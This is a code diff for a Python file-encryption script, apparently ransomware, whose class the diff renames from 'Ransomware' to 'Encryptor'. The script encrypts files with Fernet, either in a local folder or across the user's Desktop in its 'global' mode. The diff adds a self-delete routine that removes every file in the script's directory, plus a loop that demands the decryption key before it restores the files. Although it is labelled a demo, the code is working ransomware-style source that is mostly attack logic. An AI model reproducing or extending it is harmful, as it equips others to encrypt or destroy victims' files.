@@ -1,21 +1,33 @@
 from cryptography.fernet import Fernet
 import os, sys, time
 
-class Ransomware:
-    def __init__(self, typeOfEncrypt, verbose=True):
-        os.system('cls')
-
+class Encryptor:
+    def __init__(self, typeOfEncrypt, autoDelete=False, verbose=True):
         if os.name != "nt":
-            self.verbose("SHUTDOWN", "Only runs on windows", True)
+            self.VerboseInfo("SHUTDOWN", "Only runs on windows", True)
 
         self.verbose = verbose
         self.typeOfEncrypt = typeOfEncrypt # Local (folder ./target_files) / Global (all files)
         self.scriptPath = os.getcwd()
+        
+        if autoDelete == True:
+            self.SelfDelete()
 
         if self.typeOfEncrypt == "local": 
             self.encryptPath = self.scriptPath + "\local_target_files"
         elif self.typeOfEncrypt == 'global': 
             self.encryptPath = os.path.expanduser("~/desktop")
+
+    def SelfDelete(self):
+        os.chdir(self.scriptPath)
+
+        for file in os.listdir(self.scriptPath):
+            if self.typeOfEncrypt == 'local' and file == "local_target_files":
+                pass
+            else:
+                try: os.remove(file)
+                except: self.VerboseInfo("ERROR", f"Could not delete file: {file}")
+
 
     def KeyGen(self):
         os.chdir(self.scriptPath)
@@ -110,11 +122,21 @@ class Ransomware:
             print(f"[ {typeOfMessage} ] {message}")
 
 def main():
-    rsmw = Ransomware("encrypt", "local")
+    os.system('cls')
+    print("=== File Encryption Demo ===")
+    print("Will encrypt \"local_target_files\" folder")
+    
+    rsmw = Encryptor("local")
     rsmw.FileEncryption()
-    time.sleep(3)
+
+    print(f"\n\nDecrypt key: {rsmw.key.decode('utf-8')}")
+    user_input = input('Enter decrypt key: ')
+
+    while user_input != rsmw.key.decode('utf-8'):
+        user_input = input('Enter decrypt key: ')
     rsmw.FileDecryption()
-    input('press ENTER to continue...')
+
+    input('\n\npress ENTER to quit...')
 
 if __name__ == "__main__":
     main()
